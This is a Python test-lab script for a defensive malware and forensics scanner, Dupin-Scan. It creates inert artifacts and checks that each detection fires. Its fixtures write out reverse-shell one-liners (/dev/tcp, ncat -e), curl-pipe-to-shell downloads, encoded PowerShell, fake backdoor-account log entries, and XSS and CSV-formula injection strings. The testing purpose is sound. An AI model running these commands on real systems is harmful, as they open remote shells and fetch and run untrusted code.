"""Laboratório do Dupin-Scan: cria artefatos INOFENSIVOS que disparam cada detecção e confere se o scanner
os encontra (e com a técnica ATT&CK certa).

    python lab/run_lab.py               # seguro: só cria arquivos numa pasta temporária
    python lab/run_lab.py --registry    # Windows: também cria/remove uma chave Run (HKCU) e uma tarefa agendada

Por que é seguro
  - Nenhuma amostra de malware: são arquivos com cabeçalho "MZ" ou texto, e comandos que só existem como texto.
  - Persistência de usuário é simulada numa pasta temporária (HOME/USERPROFILE/APPDATA redirecionados).
  - O processo de teste é um `python` dormindo, com um argumento que *parece* um reverse shell (nunca é executado).
  - Com --registry, os itens usam `cmd.exe /c rem ...` (não fazem nada) e são removidos ao final, mesmo em erro.
  - Não usa EICAR: antivírus reais reagiriam a ele e atrapalhariam o teste.
Mesmo assim, para a parte --registry prefira uma VM de laboratório.
"""
import argparse
import contextlib
import hashlib
import os
import subprocess
import sys
import tempfile
import time
from pathlib import Path
from typing import NamedTuple

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from datetime import datetime, timedelta  # noqa: E402
from xml.sax.saxutils import escape  # noqa: E402

from dupin_scan import core, export_rules, forensics  # noqa: E402


class Result(NamedTuple):
    status: str  # PASS | FAIL | SKIP
    name: str
    detail: str = ""


@contextlib.contextmanager
def env(**kv):
    old = {k: os.environ.get(k) for k in kv}
    os.environ.update(kv)
    try:
        yield
    finally:
        for k, v in old.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v


def check(name, findings, where, reason, techs=()):
    """PASS se há um achado em `where` com `reason` e todas as técnicas `techs`."""
    here = [f for f in findings if where in f["where"]]
    for f in here:
        if any(reason in r for r in f["reasons"]):
            got = {t["id"] for t in f.get("attack", [])}
            missing = [t for t in techs if t not in got]
            if missing:
                return Result("FAIL", name, f"achado ok, mas faltam técnicas ATT&CK: {missing} (veio {sorted(got)})")
            lvl = f.get("level") or core.level(f["score"])  # só run_scan() preenche "level"
            return Result("PASS", name, f"{lvl} {f['score']} · {', '.join(sorted(got)) or '-'}")
    return Result("FAIL", name, f"não encontrado ({len(here)} achado(s) no local, nenhum com '{reason}')")


def check_absent(name, findings, where):
    hit = [f for f in findings if where in f["where"]]
    return Result("FAIL", name, f"falso positivo: {hit[0]['reasons']}") if hit else Result("PASS", name, "sem achados")


# ------------------------------------------------------------------ arquivos
def lab_files(tmp):
    d = tmp / "arquivos"
    d.mkdir()
    (d / "fatura.pdf").write_bytes(b"MZ" + b"\0" * 300)               # PE disfarçado de documento
    (d / "foto.png.exe").write_text("inofensivo")                      # dupla extensão
    (d / "empacotado.bin").write_bytes(b"MZ" + os.urandom(8192))       # cabeçalho PE + entropia alta
    sample = b"dupin-scan-lab-amostra-conhecida"
    (d / "conhecido.dat").write_bytes(sample)                          # hash na lista
    (d / "marcador.txt").write_text("DUPIN-SCAN-LAB-MARKER")                # regra YARA própria do lab
    (d / "nota.txt").write_text("arquivo limpo")                       # não deve gerar achado
    hashes = tmp / "hashes.txt"
    hashes.write_text("# lista do lab\n" + hashlib.sha256(sample).hexdigest() + "\n")

    yara_dir = tmp / "yara"
    export_rules.write_all(yara_dir, "yara")  # as regras exportadas também são testadas aqui
    (yara_dir / "lab_marker.yar").write_text('rule dupin_scan_lab_marker { strings: $a = "DUPIN-SCAN-LAB-MARKER" condition: $a }')

    rep = core.run_scan(modules=("files",), targets=[str(d)], hashes_path=str(hashes),
                        yara_dir=str(yara_dir) if core.yara else None)
    f = rep["findings"]
    out = [
        check("arquivo: PE disfarçado de documento", f, "fatura.pdf", "disfarçado", ("T1036.008",)),
        check("arquivo: dupla extensão", f, "foto.png.exe", "Dupla extensão", ("T1036.007",)),
        check("arquivo: entropia alta", f, "empacotado.bin", "Entropia alta", ("T1027.002",)),
        check("arquivo: hash conhecido", f, "conhecido.dat", "Hash na lista"),
        check_absent("arquivo limpo não gera achado", f, "nota.txt"),
    ]
    if core.yara is None:
        out += [Result("SKIP", "YARA (regras exportadas e próprias)", "yara-python não instalado")]
    else:
        out += [
            check("yara exportada: disfarçado", f, "fatura.pdf", "dupin_scan_executavel_disfarcado_de_documento"),
            check("yara exportada: dupla extensão", f, "foto.png.exe", "dupin_scan_dupla_extensao_suspeita"),
            check("yara exportada: entropia", f, "empacotado.bin", "dupin_scan_binario_alta_entropia"),
            check("yara própria do lab", f, "marcador.txt", "dupin_scan_lab_marker"),
        ]
    return out


# ------------------------------------------------------------------ persistência
def lab_persistence_linux_simulada(tmp):
    """Roda a lógica de persistência de Linux sobre um HOME falso (funciona em qualquer SO)."""
    home = tmp / "home"
    (home / ".config" / "autostart").mkdir(parents=True)
    (home / ".config" / "systemd" / "user").mkdir(parents=True)
    (home / ".bashrc").write_text("# lab\nexport A=1\n: curl http://127.0.0.1/dupin-scan-lab | sh\n")
    (home / ".config" / "autostart" / "lab.desktop").write_text("[Desktop Entry]\nExec=bash -i >& /dev/tcp/127.0.0.1/9\n")
    (home / ".config" / "systemd" / "user" / "lab.service").write_text("[Service]\nExecStart=/usr/bin/ncat 127.0.0.1 9 -e /bin/sh\n")
    with env(HOME=str(home), USERPROFILE=str(home)):
        f = core.linux_persistence()
    return [
        check("linux/perfil de shell (.bashrc)", f, ".bashrc", "Download executado direto",
              ("T1546.004", "T1105", "T1059.004")),
        check("linux/autostart XDG", f, "lab.desktop", "Reverse shell via /dev/tcp", ("T1547.013", "T1059.004")),
        check("linux/serviço systemd de usuário", f, "lab.service", "netcat com -e", ("T1543.002", "T1059.004")),
    ]


def lab_persistence_windows(tmp, registry):
    if core.host_os() != "windows":
        return [Result("SKIP", "persistência Windows", "só roda em Windows")]
    startup = tmp / "appdata" / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
    startup.mkdir(parents=True)
    (startup / "dupin_scan_lab.bat").write_text("@echo off\nrem dupin-scan lab\n")
    out = []
    import winreg

    run_sub = r"Software\Microsoft\Windows\CurrentVersion\Run"
    task = "DupinScanLab"
    created_key = created_task = False
    try:
        if registry:
            with winreg.CreateKey(winreg.HKEY_CURRENT_USER, run_sub) as k:
                winreg.SetValueEx(k, "DupinScanLab", 0, winreg.REG_SZ, "cmd.exe /c rem powershell -enc DUPINSCANLAB")
            created_key = True
            r = subprocess.run(["schtasks", "/create", "/tn", task, "/tr", r"cmd.exe /c rem C:\Users\Public\dupin_scan_lab",
                                "/sc", "once", "/st", "00:00", "/f"], capture_output=True, text=True,
                               errors="replace", creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
            created_task = r.returncode == 0
            if not created_task:
                out.append(Result("SKIP", "windows/tarefa agendada", f"schtasks falhou: {(r.stderr or r.stdout).strip()[:120]}"))
        with env(APPDATA=str(tmp / "appdata")):
            f = core.windows_persistence()
        out.append(check("windows/pasta Startup", f, "dupin_scan_lab.bat", "Startup", ("T1547.001",)))
        if registry:
            out.append(check("windows/chave Run (HKCU)", f, r"Run\DupinScanLab", "PowerShell codificado",
                             ("T1547.001", "T1059.001", "T1027.010")))
            if created_task:
                out.append(check("windows/tarefa agendada", f, task, "diretório suspeito", ("T1053.005",)))
        else:
            out.append(Result("SKIP", "windows/chave Run e tarefa agendada", "use --registry (altera o registro de forma reversível)"))
    finally:  # sempre limpa, mesmo se algo falhar
        if created_key:
            with contextlib.suppress(OSError):
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_sub, 0, winreg.KEY_SET_VALUE) as k:
                    winreg.DeleteValue(k, "DupinScanLab")
        if created_task:
            subprocess.run(["schtasks", "/delete", "/tn", task, "/f"], capture_output=True,
                           creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
    return out


# ------------------------------------------------------------------ forense
_EVT_NS = "http://schemas.microsoft.com/win/2004/08/events/event"
_MONTHS = ("Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec")


def make_event(eid, channel, data=None, userdata=None, time="2026-11-10T12:00:00.0000000Z", record=1):
    """XML de um evento no formato de `wevtutil qe ... /f:xml` (estrutura copiada de um evento real)."""
    body = "".join(f"<Data Name='{k}'>{escape(str(v))}</Data>" for k, v in (data or {}).items())
    ud = ""
    if userdata:
        inner = "".join(f"<{k}>{escape(str(v))}</{k}>" for k, v in userdata.items())
        ud = f"<UserData><LogFileCleared xmlns='http://schemas.microsoft.com/win/2004/08/events/eventlog'>{inner}</LogFileCleared></UserData>"
    return (f"<Event xmlns='{_EVT_NS}'><System><Provider Name='lab'/><EventID>{eid}</EventID>"
            f"<TimeCreated SystemTime='{time}'/><EventRecordID>{record}</EventRecordID>"
            f"<Channel>{channel}</Channel><Computer>LAB</Computer></System><EventData>{body}</EventData>{ud}</Event>")


def _syslog_ts(dt):
    return f"{_MONTHS[dt.month - 1]} {dt.day:2d} {dt:%H:%M:%S}"


def lab_forensics(tmp):
    ip = "93.184.216.34"  # só texto num arquivo; nada é contatado
    out = []

    # --- Linux: auth.log (formato clássico do syslog, gerado com a data de agora)
    t = datetime.now() - timedelta(hours=1)
    lines = [f"{_syslog_ts(t + timedelta(seconds=i))} srv sshd[100]: Failed password for invalid user admin from {ip} port {4000 + i} ssh2"
             for i in range(12)]
    lines += [
        f"{_syslog_ts(t + timedelta(minutes=2))} srv sshd[101]: Accepted password for root from {ip} port 50000 ssh2",
        f"{_syslog_ts(t + timedelta(minutes=3))} srv useradd[200]: new user: name=backdoor, UID=1001, GID=1001, home=/home/backdoor, shell=/bin/bash",
        f"{_syslog_ts(t + timedelta(minutes=3))} srv usermod[201]: add 'backdoor' to group 'sudo'",
        f"{_syslog_ts(t + timedelta(minutes=4))} srv sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/bin/sh -c 'curl http://x/a.sh | sh'",
        f"{_syslog_ts(t + timedelta(minutes=5))} srv sshd[102]: Accepted publickey for alice from 10.0.0.5 port 50001 ssh2",
    ]
    log = tmp / "auth.log"
    log.write_text("\n".join(lines) + "\n")
    f = forensics.linux_auth(paths=[log])
    out += [
        check("auth.log: força bruta de SSH", f, f"auth.log · {ip}", "falhas de autenticação", ("T1110",)),
        check("auth.log: login após as falhas", f, f"auth.log · {ip}", "Login bem-sucedido", ("T1078",)),
        check("auth.log: login root de IP público", f, str(log), "Login SSH como root", ("T1078",)),
        check("auth.log: conta criada", f, str(log), "Conta de usuário criada: backdoor", ("T1136.001",)),
        check("auth.log: usuário no grupo sudo", f, str(log), "grupo administrativo sudo", ("T1098",)),
        check("auth.log: sudo com curl | sh", f, str(log), "Download executado direto", ("T1105", "T1059.004")),
        check_absent("auth.log: login legítimo de IP interno", f, "10.0.0.5"),
    ]

    # --- Linux: históricos de shell
    home = tmp / "home_hist"
    home.mkdir()
    (home / ".bash_history").write_text("ls\n#1700000000\ncurl http://x/a.sh | sh\nhistory -c\n")
    (home / ".zsh_history").write_text(": 1700000100:0;bash -i >& /dev/tcp/127.0.0.1/9 0>&1\n")
    f = forensics.linux_history(homes=[home])
    out += [
        check("histórico bash: curl | sh", f, ".bash_history", "Download executado direto", ("T1105",)),
        check("histórico bash: history -c", f, ".bash_history", "Histórico do shell apagado", ("T1070.003",)),
        check("histórico zsh: reverse shell", f, ".zsh_history", "Reverse shell via /dev/tcp", ("T1059.004",)),
        check_absent("histórico: comando comum (ls) não gera achado", f, ".bash_history:1"),
    ]

    # --- Windows: histórico do PowerShell, Prefetch e logs de eventos (análise de dados sintéticos, em qualquer SO)
    ps = tmp / "ConsoleHost_history.txt"
    ps.write_text("Get-Process\nClear-History\npowershell -w hidden -enc AAAA\n")
    f = forensics.windows_history(paths=[ps])
    out += [
        check("histórico PowerShell: Clear-History", f, "ConsoleHost_history.txt", "Histórico do PowerShell apagado", ("T1070.003",)),
        check("histórico PowerShell: comando codificado", f, "ConsoleHost_history.txt", "PowerShell codificado", ("T1059.001",)),
    ]

    pf = tmp / "prefetch"
    pf.mkdir()
    for name in ("MIMIKATZ.EXE-1A2B3C4D.pf", "PSEXEC.EXE-0F0F0F0F.pf", "CHROME.EXE-ABCDEF01.pf"):
        (pf / name).write_bytes(b"")
    f = forensics.windows_prefetch(directory=pf)
    out += [
        check("Prefetch: mimikatz", f, "MIMIKATZ.EXE", "mimikatz", ("T1003.001",)),
        check("Prefetch: PsExec", f, "PSEXEC.EXE", "PsExec", ("T1569.002",)),
        check_absent("Prefetch: programa comum não gera achado", f, "CHROME.EXE"),
    ]

    ev = [make_event(1102, "Security", userdata={"SubjectUserName": "mallory"}, record=1),
          make_event(104, "System", userdata={"SubjectUserName": "mallory"}, record=2),
          make_event(4720, "Security", {"TargetUserName": "backdoor", "SubjectUserName": "mallory"}, record=3),
          make_event(4732, "Security", {"TargetSid": "S-1-5-32-544", "MemberName": "backdoor", "SubjectUserName": "mallory"}, record=4),
          make_event(4732, "Security", {"TargetSid": "S-1-5-32-545", "MemberName": "joao"}, record=5),
          make_event(4698, "Security", {"TaskName": "\\Atualiza", "SubjectUserName": "mallory",
                                        "TaskContent": "<Task><Exec><Command>C:\\Users\\Public\\x.exe</Command></Exec></Task>"}, record=6),
          make_event(7045, "System", {"ServiceName": "Evil", "ImagePath": "C:\\Users\\Public\\svc.exe"}, record=7),
          make_event(7045, "System", {"ServiceName": "Driver", "ImagePath": "C:\\Windows\\System32\\drivers\\ok.sys"}, record=8),
          make_event(4104, forensics.PS_CHANNEL, {"ScriptBlockText": "IEX (powershell -enc AAAA)"}, record=9)]
    ev += [make_event(4625, "Security", {"IpAddress": ip, "TargetUserName": "administrator"}, record=100 + i) for i in range(12)]
    ev += [make_event(4624, "Security", {"IpAddress": ip, "LogonType": "10", "TargetUserName": "administrator"},
                      time="2026-11-10T12:30:00.0000000Z", record=200)]
    f = forensics.analyze_windows_events(forensics.parse_events("\n".join(ev)))
    out += [
        check("eventos: log Security apagado (1102)", f, "evento 1102", "Security) apagado", ("T1685.005",)),
        check("eventos: log System apagado (104)", f, "evento 104", "sistema apagado", ("T1685.005",)),
        check("eventos: conta criada (4720)", f, "evento 4720", "Conta de usuário criada", ("T1136.001",)),
        check("eventos: membro em Administradores (4732)", f, "registro 4)", "Administradores", ("T1098",)),
        check_absent("eventos: grupo comum (4732) não gera achado", f, "registro 5)"),
        check("eventos: tarefa agendada suspeita (4698)", f, "evento 4698", "diretório suspeito", ("T1053.005",)),
        check("eventos: serviço de pasta suspeita (7045)", f, "registro 7)", "diretório suspeito", ("T1543.003",)),
        check_absent("eventos: serviço legítimo (7045) não gera achado", f, "registro 8)"),
        check("eventos: PowerShell 4104 codificado", f, "evento 4104", "PowerShell codificado", ("T1059.001",)),
        check("eventos: força bruta (4625)", f, f"Security · {ip}", "falhas de autenticação", ("T1110",)),
        check("eventos: logon RDP após as falhas (4624)", f, f"Security · {ip}", "Login bem-sucedido", ("T1078",)),
    ]

    # --- Windows ao vivo (somente leitura): a consulta real ao wevtutil funciona?
    if core.host_os() == "windows":
        notes = []
        try:
            n = len(forensics.windows_events(days=1, notes=notes))
            out.append(Result("PASS", "wevtutil ao vivo (somente leitura)", f"{n} achado(s) em 1 dia; {len(notes)} nota(s)"))
        except Exception as e:  # noqa
            out.append(Result("FAIL", "wevtutil ao vivo (somente leitura)", f"{type(e).__name__}: {e}"))
    else:
        out.append(Result("SKIP", "wevtutil ao vivo", "só roda em Windows"))
    return out


# ------------------------------------------------------------------ profundidade, estado, confiança, CLI
def lab_depth(tmp):
    from dupin_scan import persist, report, state, timeline, trust
    out = []
    host = core.host_os()

    # --- conteúdo de script: sem YARA, só heurística
    d = tmp / "scripts"
    d.mkdir()
    (d / "instala.ps1").write_text("# TESTE INOFENSIVO\n# powershell -w hidden -enc AAAA\n")
    (d / "ok.ps1").write_text("Get-ChildItem\n")
    f = core.run_scan(modules=("files",), targets=[str(d)])["findings"]
    out += [check("script: comando suspeito dentro do arquivo", f, "instala.ps1", "Script contém", ("T1059.001", "T1027.010")),
            check_absent("script limpo não gera achado", f, "ok.ps1")]

    # --- persistência -> binário referenciado (o texto do comando é inofensivo; o executável é que é suspeito)
    exe = tmp / "agendado.exe"  # .exe: no Windows só extensões executáveis são seguidas
    exe.write_bytes(b"MZ" + os.urandom(8192))
    cmd = f'"{exe}" /s' if host == "windows" else f"{exe} --daemon"
    entry = persist.entry("Entrada de teste", cmd, core.Ctx(host), ("T1547.001",))
    out.append(check("persistência: segue o binário referenciado", [entry] if entry else [], "Entrada de teste",
                     "Binário referenciado", ("T1547.001", "T1027.002")))

    # --- processos: nome de binário do Windows fora do lugar, nome parecido e pai-filho
    r1 = persist.masquerade_reasons("svchost.exe", r"C:\Users\Public\svchost.exe")
    r2 = persist.masquerade_reasons("scvhost.exe", r"C:\Users\Public\scvhost.exe")
    r3 = persist.parent_child_reasons("windows", "WINWORD.EXE", "powershell.exe")
    r4 = persist.parent_child_reasons("linux", "nginx", "bash")
    for name, r, tech in (("processo: svchost fora do System32", r1, "T1036.005"), ("processo: nome parecido (scvhost)", r2, "T1036.005"),
                          ("processo: Word iniciando PowerShell", r3, "T1204.002"), ("processo: nginx iniciando shell", r4, "T1505.003")):
        ok = bool(r) and tech in r[0][2]
        out.append(Result("PASS" if ok else "FAIL", name, f"{r[0][1]} pts · {tech}" if r else "não detectado"))

    # --- baseline e lista de ignorados, com o estado isolado numa pasta temporária
    b = tmp / "baseline"
    b.mkdir()
    (b / "a.pdf.exe").write_text("x")
    with env(LOCALAPPDATA=str(tmp / "estado"), XDG_DATA_HOME=str(tmp / "estado")):
        r_1 = core.run_scan(modules=("files",), targets=[str(b)], track=True)
        (b / "b.pdf.exe").write_text("y")
        r_2 = core.run_scan(modules=("files",), targets=[str(b)], track=True)
        por = {os.path.basename(x["where"]): x for x in r_2["findings"]}
        state.ignore(por["a.pdf.exe"])
        r_3 = core.run_scan(modules=("files",), targets=[str(b)], track=True)
    ok1 = [x["new"] for x in r_1["findings"]] == [None]
    ok2 = por["b.pdf.exe"]["new"] is True and por["a.pdf.exe"]["new"] is False
    ok3 = [os.path.basename(x["where"]) for x in r_3["ignored"]] == ["a.pdf.exe"] and len(r_3["findings"]) == 1
    out += [Result("PASS" if ok1 else "FAIL", "baseline: 1ª varredura não marca nada como novo", str([x["new"] for x in r_1["findings"]])),
            Result("PASS" if ok2 else "FAIL", "baseline: arquivo adicionado depois aparece como novo", f"b={por['b.pdf.exe']['new']} a={por['a.pdf.exe']['new']}"),
            Result("PASS" if ok3 else "FAIL", "lista de ignorados separa o achado marcado", f"{len(r_3['ignored'])} ignorado(s), {len(r_3['findings'])} mantido(s)")]

    # --- relatórios gerados a partir de um achado com nome hostil
    hostil = {"type": "file", "where": "C:\\x\\<script>alert(1)</script>.exe", "score": 60, "level": "MÉDIO",
              "reasons": ["=cmd|' /C calc'!A0", "<img src=x onerror=alert(1)>"], "attack": [], "when": "2026-01-01T10:00:00"}
    rep = core.make_report([hostil], ["nota <b>x</b>"])
    html = report.to_html(rep, timeline.build(rep)[0])
    csv_ = timeline.findings_to_csv(rep)
    seguro = "<script>alert(1)" not in html and "<img src=x" not in html and "'=cmd" in csv_
    out.append(Result("PASS" if seguro else "FAIL", "relatórios: HTML escapa e CSV neutraliza fórmulas", "sem marcação ativa no HTML; '=...' com apóstrofo no CSV"))

    # --- confiança no binário (Windows: assinatura digital de verdade)
    if host == "windows":
        root = os.environ.get("SystemRoot", r"C:\Windows")
        t_ok = trust.check(os.path.join(root, "System32", "notepad.exe"), "windows")
        t_no = trust.check(str(exe), "windows")
        out.append(Result("PASS" if t_ok and t_ok["trusted"] and t_no and not t_no["trusted"] else "FAIL",
                          "confiança: notepad.exe assinado, binário de teste não",
                          f"{(t_ok or {}).get('label')} | {(t_no or {}).get('label')}"))
    else:
        out.append(Result("SKIP", "confiança: assinatura digital", "só roda em Windows (no Linux depende de dpkg/rpm)"))

    # --- .evtx exportado (Windows, somente leitura: `wevtutil epl` do log System não exige administrador)
    if host == "windows" and getattr(forensics, "evtx_file", None):
        evtx = tmp / "System.evtx"
        # só o último dia: o python-evtx lê ~150 eventos/s, e o log System inteiro levaria minutos
        res = subprocess.run(["wevtutil", "epl", "System", str(evtx), "/ow:true",
                              "/q:*[System[TimeCreated[timediff(@SystemTime) <= 86400000]]]"], capture_output=True,
                             creationflags=getattr(subprocess, "CREATE_NO_WINDOW", 0))
        notes = []
        if res.returncode == 0 and evtx.exists():
            try:
                n = len(forensics._evtx_events(evtx, notes=notes)) if hasattr(forensics, "_evtx_events") else -1
                out.append(Result("PASS", ".evtx exportado é lido", f"{n} eventos" if n >= 0 else "lido"))
            except Exception as e:  # noqa - python-evtx ausente aparece como nota, não como falha do Dupin-Scan
                out.append(Result("SKIP" if "evtx" in str(e).lower() else "FAIL", ".evtx exportado é lido", str(e)[:100]))
        else:
            out.append(Result("SKIP", ".evtx exportado é lido", "não foi possível exportar o log System"))
    else:
        out.append(Result("SKIP", ".evtx exportado é lido", "só roda em Windows"))

    # --- linha de comando de ponta a ponta (processo separado, sem interface)
    alvo = tmp / "cli_alvo"
    alvo.mkdir()
    (alvo / "x.pdf.exe").write_text("x")
    rel = tmp / "cli.json"
    base = [sys.executable, "-m", "dupin_scan", "scan", "--modules", "files", "--targets", str(alvo), "--no-trust", "--quiet", "--out", str(rel)]
    proj = str(Path(__file__).resolve().parent.parent)
    c_ok = subprocess.run(base + ["--fail-on", "ALTO"], cwd=proj, capture_output=True).returncode
    c_med = subprocess.run(base + ["--fail-on", "MÉDIO"], cwd=proj, capture_output=True).returncode
    out.append(Result("PASS" if (c_ok, c_med) == (0, 2) else "FAIL", "CLI: código de saída por gravidade",
                      f"--fail-on ALTO -> {c_ok} (esperado 0); --fail-on MÉDIO -> {c_med} (esperado 2)"))
    return out


# ------------------------------------------------------------------ processos
def lab_process():
    if core.psutil is None:
        return [Result("SKIP", "processo suspeito", "psutil não instalado")]
    flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
    # O argumento só existe como texto na linha de comando; o Python o ignora.
    proc = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(60)", "bash -i >& /dev/tcp/127.0.0.1/9"],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=flags)
    try:
        time.sleep(1.0)
        f = core.scan_processes(core.host_os())
        return [check("processo: reverse shell na linha de comando", f, f"PID {proc.pid} ",
                      "Reverse shell via /dev/tcp", ("T1059.004",))]
    finally:
        proc.kill()
        proc.wait()


# ------------------------------------------------------------------ execução
def run(registry=False, processes=True):
    with tempfile.TemporaryDirectory(prefix="dupin-scan-lab-", ignore_cleanup_errors=True) as t:
        tmp = Path(t)
        results = lab_files(tmp)
        results += lab_persistence_linux_simulada(tmp)
        results += lab_persistence_windows(tmp, registry)
        results += lab_forensics(tmp)
        results += lab_depth(tmp)
        if processes:
            results += lab_process()
    return results


def main(argv=None):
    ap = argparse.ArgumentParser(description="Laboratório de testes do Dupin-Scan (artefatos inofensivos).")
    ap.add_argument("--registry", action="store_true",
                    help="Windows: cria e remove uma chave Run (HKCU) e uma tarefa agendada inofensivas")
    ap.add_argument("--no-processes", action="store_true", help="não cria o processo de teste")
    args = ap.parse_args(argv)
    results = run(args.registry, not args.no_processes)
    width = max(len(r.name) for r in results)
    for r in results:
        print(f"[{r.status:4}] {r.name.ljust(width)}  {r.detail}")
    n = {s: sum(r.status == s for r in results) for s in ("PASS", "FAIL", "SKIP")}
    print(f"\n{n['PASS']} ok · {n['FAIL']} falha(s) · {n['SKIP']} ignorado(s)")
    return 1 if n["FAIL"] else 0


if __name__ == "__main__":
    sys.exit(main())
